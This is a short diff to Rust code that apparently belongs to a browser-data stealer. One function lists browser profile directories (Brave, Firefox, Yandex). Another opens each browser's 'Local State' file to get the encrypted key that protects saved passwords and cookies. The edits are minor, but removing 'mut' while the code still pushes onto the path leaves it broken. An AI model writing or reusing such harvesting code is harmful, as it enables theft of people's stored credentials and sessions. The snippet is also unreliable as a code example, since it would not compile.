@@ -54,7 +54,7 @@ fn get_browser_root_paths() -> Vec<PathBuf> {
         root_paths.push(PathBuf::from(format!(
             "{local}/BraveSoftware/Brave-Browser/User Data"
         ))); // Brave Browser
-             // browser_root.push(PathBuf::from(format!(""))), // Web Explorer
+        // browser_root.push(PathBuf::from(format!(""))), // Web Explorer
         root_paths.push(PathBuf::from(format!("{roaming}/Mozilla/Firefox/Profiles"))); // Firefox
         root_paths.push(PathBuf::from(format!(
             "{local}/Yandex/YandexBrowser/User Data"
@@ -100,7 +100,7 @@ fn get_browser_root_paths() -> Vec<PathBuf> {
     root_paths
 }
 
-async fn get_encrypted_key(mut key_path: PathBuf) -> String {
+async fn get_encrypted_key(key_path: PathBuf) -> String {
     #[cfg(target_os = "windows")]
     {
         key_path.push("/Local State");
